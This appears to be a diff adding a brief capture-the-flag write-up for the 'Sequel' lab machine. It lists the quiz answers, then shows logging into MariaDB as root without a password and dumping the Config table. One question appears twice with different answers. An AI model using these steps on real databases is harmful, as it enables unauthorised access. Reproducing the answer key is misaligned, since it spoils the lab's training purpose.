@@ -1,0 +1,52 @@
+Machine name Sequel
+
+What does the acronym SQL stand for?
+Structured Query Language
+
+During our scan, which port running mysql do we find?
+3306
+
+During our scan, which port running mysql do we find?
+mariadb
+
+What switch do we need to use in order to specify a login username for the MySQL service?
+-u
+
+Which username allows us to log into MariaDB without providing a password?
+root
+
+What symbol can we use to specify within the query that we want to display everything inside a table?
+*
+
+What symbol do we need to end each query with?
+;
+
+main part
+1.scan the ip you will get to know mysql port is open
+need to download mysql 
+
+2.using parameters 
+mysql -h <ip-address> -u root  
+(-h hostname
+-u user)
+
+3.list all the database inside
+show databases;
+
+use htb
+
+4.using table
+SHOW tables;
+SELECT * FROM Config;
+
+Finally You Pawned Sequel MAchine :)
+
+
+
+
+
+
+
+
+
+
